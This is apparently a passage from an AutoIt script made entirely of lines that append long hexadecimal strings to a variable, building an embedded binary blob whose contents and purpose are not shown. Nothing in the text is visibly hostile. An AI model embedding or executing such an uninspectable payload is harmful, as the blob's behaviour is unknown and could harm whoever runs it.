    $sHex &= "5190A9769CB9E0725292F643863F22837C88045E122904F06C541EF8EB7EDC228CC290EF2F5F1830EFF8962B91D6EBCD01D448DDD4CED0DC31959634FC657D18EDD01759CF0C3D40E362FDD427E0670346C27609CD02890F1A128EF1D4385E01DAE9A70431C7229C151E6349B3A4F36337D433F0E08199100A50D5AE0F151096ACEA69766E31BD8ACAC451D4BF84D4044097B6C106AC921CFC9A17981C43C65E0C67E34EC9234A85B4948CB11B33085D26829C081D0CB04658CB39307C0C58A7F01DF77C5257301593B51175A31B16320BCD774109093FFC6D5AB981659BEC354BD9F86B410283B88CFBB13C93008700C85C38A556962349710AC432EC2BF74CA7C99C34CC28281C285D44F65849007D4B1597A883731F894C6289A01D04609380FF0904E80A5A3B51402E5253A1D90D12CCB2CE98C9A4329520DA93BB841CA565A9F0438C0532F03CA5D02E5D83B945A8020E4D67CA298C374506A1CDE05BB112C6258405F5079407ABD974D8EAC369C420E237EBBA970EC45ABAF08C85DB7651D78D6C85A330A08A3016561174E15F02088B504D81FA5A4D0DA32523ACA793CC080B8526F1607D03DCA3A55CC2D3B8FA12B3AC08192064CF39230DDEC007758B0BBD51F8BF28A133C14C91389BD6D77152AC322548AC09008E670C9997C503652F37A2971100326BF5E715CBC2E406015963E01D23773BA1BD1B65612C006F131F4DBC6108B4FDB5ACF0E01BA831E00F598F5386521652D5333FA1A186BE29E75002A18260A290685C1385237F9C810F873402573D502F4196A691A2F7F9E924E213AAF9DCAAB7562C1FF1C61326DD402742328066A8F4F3E4AF0839299C74365D2828432F1C05A91FE7243BE19C019CAE5D3B78A40427B2811E15628BAFBB7312D81A3A08ABE53BC4B1A0C1C27E544B52CA7D28241E2B6A23C36B865F809B4C05C1BA83E8416F50371C6E317123652EE074313226EE2A36C9193E23AD88B847273AC30E49783D55EFDCB01296A9D50250589B28FBFF80F58006C2AE45E0E8ED03E61C478B023637D9B4B1D8C6DE1FAD216C18E0A9F44D18020E9D87F83E261B09D13B3451CB400A25043922C17281517A655C9320041750E05E0A251959788DAB252A0B9F14A1C2B994C6143E29DDA0609160015D008D01992F3321008890ED046FBCC18BD2F39F6A1D4737D625775F243820B0091FB58431749AF5F08785122E9F4C79B848B38DD5DE787C79A14B789AD8470746160AA6F214F25ED937002068370787542A0F85BA53F40CE8D2918084AEEC54289C881B6A098B929301E4DFCAC000D4695DC25FFC1850BADF44511CADF8D24A1333EDE0C30252E05A7911680C410711F7F2DB0918D210886F21B40A855D15F1C9A1B0A42B0A0CF05E587267C348037D0A3480"
    $sHex &= "57A4070381DC3A62DF203F35090F98ADE1090FC454102E284BF85264AD40012F30038C3463FC4A65265BFDF4F4E2A2339EE0F4E7E0A3C21A0904ABCE9A6C6195B5FDD3C66B11B9F04BB055C282CD1D5C2DF406366DE040072690131A5A61E7F200BAFAB290C0EB56EC6901E65D41DE2CBFA69053DFB1BC4447045E5ABA2ED831269155D864BD73A4D71601D691AE3B57069AD8E3B5001CE2CAED0ED8C07057B147DC3F68E2C1D40867326194EE0E229640E17604B7E685F4F84B98A8AD8D9DF174D61090903BED529A6E1BBF1C0BCEBD5DFD2D0124E12C2DD9D02E5A598DC4345024724F46D36C35F951DC5156800D140341D329BCB6BFD051DC3819621B5F7C90E536F44893D80F0B699A00CEBCDCA08302D2F1A077D04C4C1313CFDC99FFB406E17B706DE067E9C37AF0957963C3A04DB2B19561B81EC031ED1DCCA4C28040E8EBC136005A2D010F91065B0F65C8010E00F8B25537107A411855CFCCD7B4FB097F75471B420491C424BD474A792BC1690BAD8B18BD088794DCC079723C208D6B6023C046C28A6DF439D85F80883C05EF02299C085B61145F3F94C2260A47D1491F81D9EB093D11B86EA320ADA18B3FF46CC4915953280C0F1D13744488A13D0347812DA5801101F99275960380890EAD2DF484B5137F1F3C24B559C99F14F0BAAD97C85631E4AEE976530B97731354080A5F35DBB8588D00208064991E526D639453053845142E8CFC63EEC79606615D0DA53DF6458914A4054722906663F8D3C2E4B395B710F1645A2F6C05ABC785D00A91705C71CE8A462267F987152804E58C8D8541D85268214DD9A5AA963529F048A1BFA1815ECBFEB28DE8EDAC6712872F84DB61F23DD018550CE3B48904C78E5D147B126D9378E73183E41FC724B614893F8EE4564CE23DB53F95013C26F1979A954464DD72378E8D9520195039760A420535CE30504714B19D1CB3F13E64CFB51732288B333F04E7571F9DF502412C54398923B887946BA22C175595232CE26320164537FB65F6386A3F3B7F447C0EB13B53CA4F52EF7734512850FF297991755752BDC1D01C6C08B11CFB28953A5A39366303BA0F0724853C99190E0C8DF9318BB6B6DE1C28033BC20F87466DCE26B4F28B852BC25D2DB341DC08FB0C0BD018E190F265B99395B3709CC0693614D920EC23A5D3DA60B703E02B0291E03B6BF3A3E02205DE1841EF8980751CC7179558A556989A776B4734932082F91D7B0C1397D048B9DC27E48C3F3C10528DDB23CA5149D7362C38A355E4A99EC0437BD0CD234F01A742FA5A48054DA3B060B8FCA52F0C21D38FE5448926E5CB59119C8203D5609585860A60D1057D27DC1B58C9BB75B918C2C069BB2B1D376FB601BC1164BFB7ED78602BE146A654C5C1076B0B1CE0615FC18825"
    $sHex &= "1F044D849B019300F480E9890350412C2D1229BA61674DEAA7AE85F86B0B4DF06FEA9554BB7C427F4E31BAC2C6BBEF3B087630F90A953C19398C5450B934E02DDF8776EACBC1F40B83843D05B37F39A6534BB6332B4DE8B4772AC14ABE6749A97460644A2E4D18F0F0F0013B422E18B0B7A0B257A336C10861F83A0A574A563B50EFEC0CC8853C8FECEC18E358C995F06FAED8410AE57705C2E85A26AFFE07815511F309D69225710F47EB43EEF70260A38B79038D651B7AEF660985258B1658083D15DE81E2ACB50834B60B102982B357EF2B1133CC58179508770CA18D1D28135B2781B1AD038694EF0252952595201C2C15660417A435A2A74C1B340BC06B6A2B34E08D0A6F246B91D80F8DF64C295C619DE086D3AD80D3811A10C484861FE42A505410010BCA660CC170F604FB08FF1AB7617747970439852B7F252947C0242BC1510D0B92729FBD6D480B9549D59636873C5E847C1D4D75A9AC8B68BAEA2362AB85F614EB50638E04A1F875EF640404410B3B4D7C1B99B3B07BBB218A082D1A6C996CE03D1EA6E4627800EC1FAD01026708C6B243EDE4C2DED7A1F53D24DE02482CCB907A6332F10E043C090B912A1B306778FC24387393FC11700B527FE6C0E04A4D498A1180AA24E3D9D41A37DACB3DE562D7DD11DB019385074AE00B1AA4ED52A870613867D46AD9F1C8BA7BFC7D45BC7E650BC62A0F922EC22B2F32A6DE80F2DDB1132D4EE01558AFD85E0C5F1502EBAA490739DA742C9E0016BB7D3137E0A6E9748980FF18DA61174605A36785704442AB0BEA5EE4CA32493CFE11928E02B05F185EF2921A082AD1FC870161218760195938143EE5AB61841998670B5F5144219E24E8E2100443638977572D96DEDBE1975E1505177C892706507BF09409B246352C9C7C597B052C12A9CC82602A06BA2D605010D6AC1C08F7A3D3668B844A4F1C86855124853C76C4A0D300710FB73FD1428823E841EC3F804309EEE8CDE8138770215091EBE1F248B85C5695E8ECE172492377E8E8EC961C482359E8E88BC2A212410ACB48B224EF00DF060E55D6A55CC9D02171E0DBF25AF17351485793A50821AC423D4967A95CC068AF396CA1F07249E572F0F4F0F0E91C48E5F4F0F04310779C6EAA6F2DDFF482054B01E745F09C87A413B595F24B576C4D141E03CE673BFD025C8F6FF4FFA9322213756FB6B48B70D560A965C10C62EB173E844C32AFC994B1C2B7480AE2D2770DFD1312DFF9D0A952BAD65D3150317E59DFD275191992C908C43D8AD865CB600C16300525F8BF443D42131CFF0AFA14BE215725A56FE8AB49C12434022EF67F0558C43071136D41CB1E5377033648E6E443DFE4034DECFCCB780F47709F4AFC95C0924EE2F0DDA704AE8827E4400DFC109AE4ECE5E8D0905A"
    $sHex &= "871F170C22664827CBA10A2AEB9E492711EB1CD8F04032479A1411D89C56B32C181BFF4B3829069E0C0CD40359F4AD7FA4B8C3F567A7B524305864730B300E62A16756C4A185A6E1977AB02E80E019DB20894D78138B047916F12218F03BA405094E370CA067520F1C86CC356A8B02C2112B5A21CF6E1C0722101F808506565BC20ADC148D1603ABCD6D00F374CA67E0FCA70C0D495C337037C8544AFE14B10C19B89BB73C764C71FE147A0A9583BB0CEC8B094F53DF9083910CAC4A4680BD4529208C40AFCADD7B802B1B89E9E02A443CA4886BE0461148B18D8938B8E4D87DC9CA9D8E44A7FADD6C592BEF9258091023849E008607C908754C18E5B103EF8BD32AB61008754208174A695E1F361DA090D77E81BCF0756342C07389608C0F4B0941DDADA3248381B020B0D109C21B152CDDB20EDE9CA21CEDF730D38F54FA6E5541122EB66D9D1D517F577F1DDA16A671ECC06B1073705509DBDB68021E71A67D10A917D5AB4362C2DA66E16F5590015BEAF03DF64D9F0B091F321127C103C4B455666B4D1C441DC31A083929612AA7AB084BA5B04A89631E61AA85E037F005F05C2EA95CE0F0F0E0136C03A9F01C5040E40EC46525AD480603F0E9033750A9B10B201205E51404117324273FD4C745BCD4BC210CA044BC0C9A50971F3FB9E42BECD806165F0B7E50DC3A1F8670541B22F9C26169E47F137C738F96850D144D37A1612CF589288412BC301A6C1CF8F64BE14C9FB4533B752B5B29B19D490839287F1F4104EC495DA12D622CEE6B67F67B7D55B2257140428B845B2440F6847B73E42D03C8B0319AC1F8489C55A5E42FC3683F45D0529BB17A2B43400B0FB6C823C81656EA0357D9920F3AF8D96574A8DC74A4424022FCFA6B7C270E0CED6F2B03D3AC805BB12C9D3DF88DB713476335CC8C155892EB3B1C982DC172D3753E380AE251EF741EAD1329498598E9899706E3E95DEB156F9BCDEA2648BB877D0B25E8208977217B652C452D7E1F7E02ADE8CAF4B8F08D4A518AF69559198E5940EB7ADB79483C9B10E87CF0FBF07928DC29EB4F2E7FF072B9A472E8F0F0E8097330A0F0C3F0C4436890C1A21C896136DE5C53466D2406C7A566B6C51A895144EDE5898D04113916A73059B2F635FF69E27203190F413B11E04DFD55973B753D474322AE314329D5D8459D1BEB27C5BB23BB88E5D06C1A7DFC88DD1603AD4A2BFF50245280A1C92EF528BCEF88A7C918DF714084DB5567C527080060DF03D3A04B0696ACBFC030C146012F0AEB10C379E1FCA34E5432B011EB21E1BE4FE84E17C9D75904068502457816A6DA1F489D95819813891CC5E24C943513DDA33C691C8E6EFFFD5C992E19E6BF7E32108A2300126AFB7A3B44260367F96FD6718947EB40B1D96E6DBD06752852"
    $sHex &= "FBDB85D5C06A0423D5832169CC12E101739534D7D638F014A1180F8C5D777F9C88A95D5FD3EB4EB7AC1900B118055685C877509E3ACC8D145FF8B23B45C602B7F5C26AC918BDC9A909341FA40080BB3530F8A53B689628D720131B593110D259023ED7DC255C3004909C0B474A058D77206823377883C8D2B333B751C26183F56C9DE0081FC7A80FB5FFDB9A64586C8F9E5F381049180CFB01DFC033B151B79D845D5A5723354679631400B98B929FD4E9371273FB10DF40E10BF344EB0C94814000C9D56161E035526D6D22E58525B47F23B251E4C228F5372564A4DCB4EAFDBB891329D82737193813E03F75C88B750A373FB41011410CF47D8D8839BE7B3F9184A235003E436D3389118BE23D6EEB21E585543FF218B8B891C7D963644B45A42B9E18CA547EC48A851381D40402A426403804292B7484C340FB3A58690A70B9581CFC1801C0042D36819BD344076067774200FAD4086B66151B227D4BDA08BD2E2097B45E4510DF6100E3EA68204E1864D22803A960190377A9C7BD810296B4A05C1BE44A5F24502B2001A0B292002781C62EA051FF156E7A82CB107D743374DAE24CEB208EE0124B100A6E9A007FB7141614583090017E1FCE16DC4EAF550203B70AD8CD7D3D598A631159C467DA8D9DC28754C0619400A7121830902F5B5860F5DF87CF29A252D80E8F3C4D8D510B976A3A553504A7BB99F81A5D750D3470205F07DC912B40EEE2F7D23AE84DEB5955AB3ADCB411906B9125B29CCE4D08511AD191F4113DD816899188013599CB766033397429E125B8E01892DD8481BB1814BD548C2A470F811E643D4658B821F1A76C2F014B6B43606D9D7DB400C31829890248A7B81480600F1E695189D6392D87EC4C939C86F4094E789FAC1836569F2E171A3207FE1F18BD0D4204F79C0CA1A6135A08C3F798C41F28A075F1C93945F47494B1389215F458B294318C1DCB7F2BA9D202D63CE890879E086F04054BB9A3C9544ADE2628E7025C3809BF6E7938848B109BF4C119AF2D969348E0E4E76195B52A5D2BC0B7281418E7C60934EBA70BE4E710680A47D9A0D4B0951445AD01DC0902ABE020C412BEC2E79D08025B7686FBEC6B25B0603794E521D6052044733B6B59870A1DEB06D911EAEA84CE6901DB56852D7389735354E3588241EA4F720F51E1E754EB26B7A08276D92B6163AD01C69D58D06DD4C3C808297F960861630D41394A7088C27F7A6010DA11C13CA835005891E0518B2B315C1CF7B02EE8A438F8FC9B88A990606747F2339A02ACECEB1DD3C78D8B28D4820583A418D305991A8FF09228302BAC1E4F50EE21B303BDA222812F4B177CA275AB0B30D841010C930E01D520346E4885BD41F885060295FB3AF0803222255FD87A80D69AC4D00A23B381E9880DFC"
    $sHex &= "940A48877509B5BC71183801625B532A83F404179FA1890384C02FA5C275027D12FFDBDC3431E8D339228C03DA426818CB3DD61030D4C41C07BEA1CC6722D40415A5218D44837A6B0D3D04074AD7D4D32BC82B209040ED3616EC0222BF8D1D089687328F365E890843354FD37A557576D6A169DA724908084A757D2C69A8E67FF7B90844D2D3008A03EC73D071521879581956F803E18D8C594D4FC066E1655F21E0696BF26EE008AB991C68E7E052EAB0A532889460AC195869CD1BE0C35211C203DBE03BAA008B05740A4A55C878B0D7FF18AA58A8BB4324DF744D5A1A324FE913B9C4510C00DCAD4AD5A14C85C40ABD16335B6384A11318C90F15DAD1457C2DAD88C5364C95C4CCB782101D43328B44B2790A9E2143D08B4594855B7C0AC24D1B9A008566092C538A2BC4DB759B4B258D11038C632E50E07FFE4A247E336802C5A54E1A6561272F35C1CC7D1149EB3C958951318A80674A02BBCBE0C09942F79E2B7C000BACB2033CB90D0E752558B12194D46210E792812BC289E084BFF0F81CB107E5A39F8214A056572D6A2B4BE3C0500CE328E886126C79117AE204916156D580519C989C8C0F4002270A48A5868052C76AFDA7DAFB58D198BC768A38C70B683E17CC4A3CDDB0646569534226B0E526A221255FCAFA149012040ADDF0C20FA4608C0F8D0B3306EC603000B2497E8C337CB493E8E2D847D8899609B616976A4CFB6804EE18F0250F8D1DDC81BF05C344414A40E9E2ED94398284154BA4E70D5B3BED71006406580DA320AC055306019F827B08A3A50017B7F09D5E0B48353B81786373B67D4D881BBBE399A7E1095C52D0890B139D0DF5BCF0DAD9A2056B0F43CC66444A6C010F70E3D0B3F122F1608C442009BCA0850990780E945A37D2965466E0BDDB6922347F8B198DE13284475C944E33B3E7012934551E0418475AF2B0EA50857C382389F7D9C8A0036B2D3BB36C81680C90B730A8392BC106161874314D57CD80071566A323C08521A520910BD708E07BC3EF1E279414416B15385D447D0FB843F515D217D147DF27CEA0978E6208F8F472A40DCB940384179B5D1C12F0EF9C7BD052DB3C0163C5129CB969DAC3C0369C9CA47E5D48014C0350369823523F6EA0CE95A8A75253523EABE9EF02C0EDE83E570A7D9804F89E02B27481C51D080D25A71CF2362CAA9C898C85D0D2A68CBA074B9891EAE99D049CD7F5E8818E93AE549916A7DC3033298D888C818909A49E7314766D8524FD0BB22BC179A899AE4228EF6F80C17B4444952881DA3D64E239269B9EC480EAEE638E2D4A7EF044FC4E952BD13BC27F7361CD7578C34185657F8D139E2403DEB52471890FDBD226C0E1A46643A42158D918D27C24DF9EFBA01452955C0E344DBDE15CC4186326A157072342"
    $sHex &= "2E17A7DF9F2B69A83A83791C77F2B7740222559668D41992BF3C7DC90F4298709BECA3E7E316B47D5DDB1A271F7CC36803957484071F6706B5200684016438121F0F4BE3529198C3B888888AD40B1C39BF7D867B24E2F5348D8D69910FDB2A93590B20B88807977488698863C14E1CEB2EB7790D5F369A7148FDA3080F448E03054F23CC4E5B68580B87608D5D1CA452690B6BEE9586001286B5AA4CB4A61FB5109DF3A739835B25CAE3988F43A4C38C543C189A010ED84E1C6749152CC582934A5EADFC1B3C43628D42483B85732261C57B962F7E97695952CE54DA2EAA18AA3B63BA0816287E4D1510A56C2F1C977414E39D2B3252F4760D89161474C770B038109FD62A70FBEC310E84197945AACD90FCF911BF880702C797C47719740CC74CD5E960D4701951B9179A61DBDC2C505119BC90591F42DA3BA82BDD6D551065586E398959D273CC3499E2898B8B8424972AA604488070103B7AA00326B882F8FAE51003EDCB0C050B8493D5CC640412B78024E748D1011F4A137089739FA06C720759110CE0FE7102EE560D1885F500D9A5BDDDE804EC5D8EA977009927DF2BB43BA2A716500037C11DC449083D8B04C1B5D416560C1C3B31626295044B054BF7D782C8EBE50395178999A5054F73CB824160EBEED120415193D6B443D805F5ABBE4F168ABD5287D43811C14FC5A722C3E1087535688CD410007E0A5989387AEEC115C6950FBC8830703CC8426ACFEF09C5CA284D484470A43E16DFB5EC21E4122AA42F5FBEB7481B49292D5151A9D441B81B634D80CA999EB18D4FCCFED8DA11AB04C93830C8F9A1C6532B8C64C8FE91E44658D0FE0E176C1370DAD98D3D51187CBC4CD3F9DEB90F0094BC61D47D55784C03988B1505C35B41280A98ACBDC4FE69E1392DB7E5635C890E3BE9C9091C3CB103726F153885F3EA909673E03E08DBC817A98D9D04A74A48717801EB4CD4485B8ED2C256D8270CDA37645CD43B830F06161C4DB615264F3C8004BB3975317929E0864DF4995EAB6B7E79C1453632D4FE11AB8F0B21BE7C4C85A87524152834DB422E1543E58F15078EAC10434AC44265D52A105F834A48FE746CD1145E8E958E37730A6025EE9DE85FE9C4600DD2010065F391E50B69C40A7E1D9CC2B6B93774048AA1DF40D6ED201BE162E12B2CF9E80416D710887D4891188831E9632B70845368C0F76F0722BC055B33FFEBA7328167535DC643F2FBABDB17458C7D15D95149E3114DDA5D76EC868E74DD885CF3515D0016059563895AC0C5BF10C5D402CEA61092A201CD9774DE243089B351A1C0C0FDBC8597A74EF8651A37D4568A2834D2F72D11B76AEDC19F509A2E6A242EB675B91D086F43354DF78A42CA8A50478537C9B4C9916630E80852A9F8D628600720196D2C841C"
    $sHex &= "190EE46F4202506B9087BC8CD0DE51C1F000B8B131A9D95837D3508EA50CFE0C77B1485701745A7B2A500A85304B96E000AC4A720BEDF06E25C75DE4EA830A5ADF02BBA3918257C5697415E798968A47C575702B294D8F90E64110D810548B2D2948C845D8FAD8211CB486512B69975BC0D6FD80A903E310EE9005412C4C17755C5F513308C05845BDEB533D0C12824F7D44262EC245ED4499FDC04B87B4BC01374893A15DA3972422705AFF0000868843418BC483C1A17CCD9AD23636297DFC06A0E89095641A1F50E20675FE0C0B2080540B7EB0CE6C008FC3027C79041AB483E148F8E73FE208966A9298C004809616F48F6E25E2B4826D38D697108A9B594A710957BF5F0DCDB1488547ECD46017F45F0B40B51B25F10663C23D28083B89372A252254813F9E46503810450402BCC41494484FD00E0248D158C25700E724D1E0B0C1B454B403FA951B4422A7D78B0B021352ADD86B3013044457F459422A1AB7914D64502200800170C9040524DF8A858393718A63758FE07081B2FD8A1E34092A849BD93A1EE316C318066B3FAE55E07F0A411BD40D25389E2E60189A13C0D77641AE00C3D02FDDD462C135B58D163C48B24C790B4001B8155626963BED8784FA4D2E42FA742526D0E203142F45D47201D8E624F50295F36C854E4EE38504B12050EFD330BF90EEDC01C94DD37494CCD4D004068C545E09218DA1FCCCBA1635780E324F196202E92DCBE97BE11135FF5D088D1A98B6C26E8DFC5A6124F949A9E17F3052396281F0F0F0EC4C9D28B1206AF941002D26472DE3109002C21395438250A45B76795956405045005357A0B0B7410B213553784A701117B393E95E4BC452B615F85C2EA95CF4F8F8F4649C03A9F8F8108B60C199DB7419B31573275E3504B1E96B7A30436798F8F0004543775E97B1862FBDEBBA92580C06759F5B91AD25ABCBAB558CBEA914C342B0616A20753D320CED1115230A4B61D51E0B9B1B57CC30B0DF100AE2041D3D228E498E77303910FF352E906E159B797E1AFB4500D1689C1632415FAF518CC6F4D1173411A60F61B2297DE86C681B39748CF4672A01F069F495CC22847E0231F427AC8E5DC64953887510137551FDA104DB88F73F7F7085719C7231258A201C57F9513FFD5F6D68D30FD33BC27D1500DE86A48D2795921F9BADC700207CE4B88217162A43F46B82896845C1128F9D1060C2FF6F04533A723D502362F8F096A05585232AE2823899652974426223EBDF145E386180DA721AAD0713B77410DB64AA0873B4CC917E64E102C46DC0439358DB69F85841E9C93DA718381F976F2A427D24205427B9128D85810D9610B1278196022E780D2C9324129347C2E437959F26D7FCA34046A8D1DF4661918C08936F208581460D46080F93C08C"
    $sHex &= "A721B80C0CD9400FA41B4EA6262920406F8227F02FC2D286C6079F19079968725002B0FB81250375E403C6C60C1304185E692BA85BE0D45EADECFF761E29EC7308223D4099EA8F876C2BB9EC64750BEB1849C1BDCB683BB4B4B31A1400201AF99625C637ECA4761FCD364D85A781770417ACA7D0D61E9FE33C653A497D5376772871001F7D134B4C10DE102DBF2D038F2107243C60000B6E998381D55843BD955D115FA6ECDD3D31560516777D3FC6088840B196743C07AC6561B0FC55B2768CEA937F5B21A18717B15EFA46070439292C084B2E780DD71CA620444C555F0C9D201142C99E3B343027878729498489167B89F03C937303D71CD35D995A33CC230C977031418CF73D3661D50C34135B7F212D5B48D73A3BD08804AE1B2C2F1268081E79BF3034FFD23530906E41308CEF2251E9321D69C6A4A535EB18B695148EF25D2E7814B44BC65323C5355AF8243F1712031568FF0E5A810F8549A75716BA8282F62D34A3C269112D482F61D060087FA214606C55778AAD2FB963837C029E4E055C94029D508ED9462A85FDFCAD589430CFA38C500980AE5B011B5A213E08EC89652290D8C2F6177B3688452FA01A3D902E2122371743C421279AEC43E06D4C9A3912E4268E3E8DEFB07429E96CA19992DF1C18960E32C6C115B047828324FF6F392234C5CF66F8B66F86F151167961C45C8B406E43BFF471481696E46CEB2FEB8E06F83289904183D4B4F023E1A5090E6348FCBF6D1C338D1075737D691BBB736F5018211281B11941B78D10791C2BC13F4CA6F0140A2598641380C4EBDD5B9C4B27D39F1115382923080BF130631D059297D7102B26F504281CF3C0442B1CD4191511A0043451DF14C74C612BC7FF03680A708D61232069D01D860BAF45EB1633387C5F6B86073D5F383242C4D22FF5651DAC20F76E657830996A50D11C046500216080C21F407026852B7924A702190753FAA161F7A0232820F8B31481815614A6092B89D2A28021A441F4080CB26921084D7A011AD9AA37FFB1888F45FFC2154DD684004EDEFC7D13602CA70989DEBCAB00C291FB127F08234434E21851A1A027590E189D3878981A10CC189912320656E518212BEBC7202D4D4FC786DC3191633122900E40772FEAF26CDC10061818A0970CA371803267066400E920713B44C662BB2BEB1E58EC4428A3E3B9229C3F82850EB8A267102C0C607BD5198B7013C1134D9318385484F1344ABF8F0F8452E3405C8EC6E259B9326440A61322270E80834BD0FF017A07A3207DC605C900E08ADABFFCFCD93A8D090857043002B0530B28B72135DEEA86774DB55C93444C1B2914B2900D4EDF5D4C95A1A9410CCE87A1898D84056E132B89485A436FC2385C0DE200164E608E2FA1F453BF4A22110429D40514C2"
    $sHex &= "CE2F723D5D40C195A5CB99DB6F4983DEF7EC555B06560065A58212CC67DD43A53D18DFC86BF0F5C96C044E1CE97E71938C4332465931198B60EDD5460A4C36393AB28F9C18B2251764750BECC5C402E33E93C9F0B008D2F86367925B6B480D41D014A92446E43F77045CD41A5F568050BA3813F0434C8C029A0C9763007A1833043345013473408CF0132C28683B0016C775BF374DDA0DB59DEC2175490BA591F72DA52552989703A85D0636218D5D8235C258757177008E48C011F062586869B34FB84FF2A0AEB68FF8C5B6908E4AB5F4B62D226A1DC24B1B586C1311B791EA490A2179684B0760514567E446062CA064C71C0EB9BC9017DCDCDCC821974BDCDCDC89A3A11CDCFC6F504B0AB4DCFBDE8441835F03F72D62F8A681541B27A38634D2E0F303248CACD0D2EF093B48E050B927350116C13DD0306078B9A1A1EB271A8C8FB1291C5C8DBA22B06158335C4C900E082C5B6031FF45E02275CCB55C6683E8373D51235C9777C342E8624FD5BB0C35646C04B0CBB80D4DB3FF28CBC07103C2B7FC3743B911DDE42F03F2E927847523505836232DB0420D16674488CD023653BF70AB6891B31F8D1F301A193331458F402AD42452FBF3B44243686D393D68144EB1B11A546F837144C1BD6B76413F03F120508FDF01A8C4DD5DE4CBBC56174A342409732050D2E06A83F0765B4D57D2DEC7AB7725AF011CEC73EC115D72C9ECECEC9F005ED232EC0E352003268F12AA55A33445C6DBE0961D267049ECD8835A66B4AA93ADD20B56F472355F4D5B0AD702C2EB4ED948DE8235433F977E3DA9F91D1D0350F16F0D38CDD00CCC48FBB1E51C1810E79D2DC2036105F00DA345013C81E76DA28F80C333257D28AD2D28512CF3F4241989A3EF6B311958BB7F828AC414D169E341670268F8252604705DD2AACF11249646A25B22115A0E5C41B95CBA2D62351B5F0ED6B49C1B7CE13E1DD7B7D6B216D8224B0502407829BC252D08680102251D8908511A7F2A4F80F0212BF8284C43694C9677C7830838540A906C5D80FA2CE810D1E06158A16753B8B934CF9B49624CD01D597A92B11A39E105181A4F7E04DFDD0AC8B3D4F44077A55D241337F88F97216C26FA946A58E5855012062D5A5017C2286DD30F500D21E09E6D586EC103C1C898852263B22140473600586EA0A546C74B4C3FF8C3402139932D6C1CCABC4267340707A5D8072C0B5FACA4A60E7F385D0DB01A218DE40032460C25D2C637D2BB19111B23460AA85CEEF0182B404F871E6876E0775F6A280C640C2ECFC87124104E285D5DDCC6AB252C1C152715A4F925ADDCE0E81B9905C99903E02470747F7031A6406946F0C08FD4C6E59209219898C0005290D86D1DDAE602560B5CD43ACA0EAC796520963BACCCC74594940EA439CC"
    $sHex &= "AC94FBA1646CC4037241B07E0591EF4E80AEB1482D42FF3D97854F33080A204D51FF4F262E4DBA9E901D190AD0C1BACC5AA8EF03A483679060720C0A094BA949CF7706076454B9A66EA28C31C8801AA8F76DC83945B0D438D02B004F6BF8B02B84C3E40970ACA9A16F001F1011024143AB4991F0988F1953A85AC5DB1F6857B37D34900FD0FF548B7405202F5C876E2883A9F305ED1A404B8D295E20217F7AA9F4538B55F430AE530F7CAF2E27A08792C1F40174BD84D02402413A6B11450B8793093F5E374D4025E3372719CF2789002B6185D42E48A42BFFD117A7CB28625378EBE07511A1293562693DD805D7330A8226599D638F5C00D3A464920B372CD9C48320F7198A30C6BA3EAC2C6D9018CDD4EBBAB5D6B5496F1B359C2A3200E44260CD91BBA1B3705AE47B6C1FBC7506CA07E10C1F01B725004C8122B1C0394F420B063F01482DA083E327E00A04AE422BD8120359817550649D570449BC250960485C09BCD6215602D875AFEBDC44C061D531D8194BAA64B0C07D85C22AA35E8C171EEDB5DA0DB81640F4705FC174C878A94CAF183B524538421D51A64B442845ACEF58D24C4521B8B8E0E30E188BB8279A04DA4B75B4E8B47A18B8DC3FB40FBEA0B317661BA7DC4D9A2E21A69A5FC29FC8B41B074C9CD1B41EAD2EB6621D4599E258C6C97A664E3BE249C65489D0642B2159E95C0C7DFD5BD022133706BED0B0A315083DA901628946496032B1FD530B07A34D6A02AB4B702B92CFD43BD582E1AD61FDD5EB4A26F9943D392E3ADB99522F7413A7B0511581606041B8E3E11BC6A1123ED8C2A5B0E0414941883351D267D88927E008795D3D70235317F908272616C95A1317330187EAB182AC5101EBC591FC0D1CAD5FD06C6EB93CC00C35DC3A171C4BD011E0F2DC3701C4803CB53C6A027D500AEC93BF27E096CF4B8AC780003B8D8083B61905265565611500C1CC8D781E2C32378BF8ACA070373320D97DE6D846A349C797B4E9A49504C14C483708545DBB12C13DBB0A05613F10BE59B2368C213CF94AC99B4D042D6C435284701325E90E848DC00DE7483D4E863096069411AF3DB279F2D21091F803A523D475BD01752BC20118A071F46CEA93778A320C0355F4E0EB33B0C9C14C7502544D180F880EB7961576BB67CA6894802185D6A60A6028FBD7F5327291F800E16833FC4C96C163151647C70C0614B0068634D36528D2B6F06212D1B58103D3A37374A38BD24D3EADDB260E13F1454E7C012D6E81D07AE02C75C9C2752A875041B88936B124618A3D0EDDEB3B531826D8E84C2D185913034967FC08C1C67264820B26B289E5D0F4671CF2D2801CDD2DECD0C08BD25282EB61E23B311F1F4C00EED91FDD269F2942D22F1F8495090DE5BE99C33837EC6D43072729AC46"
    $sHex &= "5FA4771C1CC80C0EAD7FEBF8ED00B228AF815D5A08060AC08B43D3022512A7021F6C560068AC45613C187804D6AD81CD60EB1531833A01082883A0A34F1CBFD2EDC7244F0F851A05AD184D86A60889DCFD4007D6B123E0451033023F0F444AF31BA51301D30718286303640C168B033A282053458850E022613C7213D225C09B99892C8E45E2229757E080DC9447387CDF07B00B7F4F2E7F184BC1530CC5751B6A83A95590261851F41B0AD2900CF4F04B4174898759CF33E5BC6868E8154D0FF9F0C770E10D9561F33703067E5A59EC68405EA305859D0684E0BD319C0D9F207D65E0878D3B91B8B089FD05610C176BD8A5AD09D2D0F34BA70E26036740E12C3B704D904B50E5A0944241E15C2410EBC11101F2EA7BB59A45688B4439EC5D3865E1ECDB92141A2C04D03510250C9530BCD1155E0C6387338F352CC5647360AC6580029C302260C9019774C7484AFD50A1100376032B2DF13590B500B0F07D3210B230E4D0531AD768793DFEFF200D331243183D4A616ADB100DD0180519372631E45E0DE44C45EC7667BBE01484340A1D1A867B7C8D95FE53A46E0B382691EE86892BB3D3C8A1BEB02630E7815A80BB60A34C8D608F80D0D8E3356C41336A88652BAF3F8B3194F5E01C128F03046C2035679CD804D69EE700421B9C11410F41AC860098EB2194D1D2705A808B94CEAD75962F9822B451F46B018620572CC8ECBC1248B88B4DBC260EAF054299039B52B40F01358DCC8F8F69B8B0978BD6275747792CC3035452C5422A20E890D9A929C613C6E2ACA83E741A386C172E8B45ACAFA5B049A487DFA43AE12503A1ADEB4789DE5B51324802EB13F1623818FF60D5751FA26F37D2A9A92F0741B1CB35D08B20776B345EBA2E4F5F6BAA0DA89690527D71D1C454711C2D11ED1AC5A0C5AFD270C26257016B02B06A69294A4E3518BF2DCC4E1C0C367FA5EF41A39094B7A48B66A5C19F280A45E09339D8471694C4C650001A5B293259B052263A852E41E45D4728EB43254D13028423642DB311897AE309E1BF8D42481883DD2BA003D2B